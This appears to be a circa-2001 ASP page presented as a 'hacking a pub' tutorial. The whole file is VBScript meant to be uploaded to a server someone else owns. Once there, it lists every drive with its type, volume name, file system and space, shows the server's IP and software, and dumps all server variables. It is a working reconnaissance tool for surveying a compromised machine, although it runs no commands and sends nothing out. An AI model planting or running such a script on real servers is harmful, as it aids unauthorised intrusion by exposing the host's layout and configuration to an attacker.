<HTML>
<HEAD>
<TITLE> Hacking a pub tut by Skkwiddly. Wa2001 </TITLE>
<META NAME="description" CONTENT="ThE HiDeOuT, InC.(we are watching you!!!)">
<META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=iso-8859-1">
</HEAD>

<BODY bgcolor="#FBFEFC" link="#2A75B9" vlink="#2A75B9" alink="#990099">
<%
  
%> 
<table width="750" border="0">
  <tr> 
    <td width="250" valign="top"> 
      <p><b> <font size="-1">Server Date: <% =date() %> <br>
        Server Time: <%=time() %><br>
        Server address: <%=request.servervariables("LOCAL_ADDR")%> <br>
        Server Software: <%=request.servervariables("SERVER_SOFTWARE")%> <br></font></b> </p>
    </td>
    <td colspan="2">&nbsp;</td>
  </tr>
</table>

<%
      DIM fs, d, dc, s, n, sp
      Set fs=Server.Createobject("Scripting.FileSystemObject")
      Set dc=fs.drives
%>
<table border="0" width="750">
  <tr bgcolor="#548596"> 
    <td> 
      <div align="center"><font color="#FBFEFC"><b>Letter</b></font></div>
    </td>
    <td> 
      <div align="center"><font color="#FBFEFC"><b>Drive Type</b></font></div>
    </td>
    <td> 
      <div align="center"><font color="#FBFEFC"><b>Volume Name</b></font></div>
    </td>
    <td> 
      <div align="center"><font color="#FBFEFC"><b>File system</b></font></div>
    </td>
    <td> 
      <div align="center"><font color="#FBFEFC"><b>Free space</b></font></div>
    </td>
    <td> 
      <div align="center"><font color="#FBFEFC"><b>Total size</b></font></div>
    </td>
  </tr>
  <% 
    back1="#D3E2E7"
    back2="#AFFEDE"
    back=back2
    FOR EACH d IN dc 
    IF (back=back2) THEN
      back=back1
    ELSE
      back=back2
    END IF
     
  %> 
  <tr bgcolor=<%=back%>> 
    <td> 
      <div align="center"><b> <%=d.driveletter%> </b></div>
    </td>
    <td> 
      <div align="center"><b> <%
      IF d.DriveType = 0 Then
        s = "Unknown"
        IF d.VolumeName = "" Then
          n = "&nbsp;"
        Else
          n = d.VolumeName
        END IF
      ELSEIF d.drivetype=1 THEN
        s="Removable"
        IF d.isready THEN
          n=d.volumename
        ELSE
          n="--"
        END IF
      ELSEIF d.drivetype=2 THEN
         s="Fixed"
         IF d.isready THEN
           n=d.volumename
         ELSE
           n="--"
         END IF
      ELSEIF d.drivetype=3 THEN
        s="Network"
        IF d.isready THEN
          n=d.sharename
        ELSE
          n="--"
        END IF
      ELSEIF d.drivetype=4 THEN
        s="CDROM"
        IF d.isready THEN
          n=d.volumename
        ELSE
          n="--"
        END IF
      ELSEIF d.drivetype=5 THEN
        s="RAM Disk"
        IF d.isready THEN
          n=d.volumename
        ELSE
          n="--"
        END IF
      END IF
      response.write(s)
    %> </b></div>
    </td>
    <td><b> <%=n%> </b></td>
    <td> 
      <div align="center"><b> <%
      str=""
      
      str=str & d.driveletter
      str=str & ":"
            
      'response.write(str)
      IF d.isready THEN
        set sp=fs.getdrive(str)
        response.write(sp.filesystem)
      ELSE
        response.write("--")
      END IF
    %> </b></div>
    </td>
    <td>
      <div align="right"><b> <%
      str=""
      
      str=str & d.driveletter
      str=str & ":"
            
      'response.write(str)
      IF d.isready THEN
        freespace = (d.AvailableSpace / 1048576)
        set sp=fs.getdrive(str)
        response.write(Round(freespace,1) & " MB")
      ELSE
        response.write("--")
      END IF
    %> </b></div>
    </td>
    <td>
      <div align="right"><b> <%
      str=""
      
      str=str & d.driveletter
      str=str & ":"
            
      'response.write(str)
      IF d.isready THEN
        totalspace = (d.TotalSize / 1048576)
        set sp=fs.getdrive(str)
        response.write(Round(totalspace,1) & " MB")
      ELSE
        response.write("--")
      END IF
    %> </b></div>
    </td>
  </tr>
  <%NEXT%> 
</table>

<table width="750" border="0">
  <tr>
    <td>&nbsp;</td>
  </tr>
  <tr> 
    <td> <font size="-1"><%
for each thing in request.servervariables
tempvalue=request.servervariables(thing)
response.write thing & "=" & tempvalue & "<br>" 
next
%> </font> </td>
  </tr>
</table>
</BODY>
</HTML>
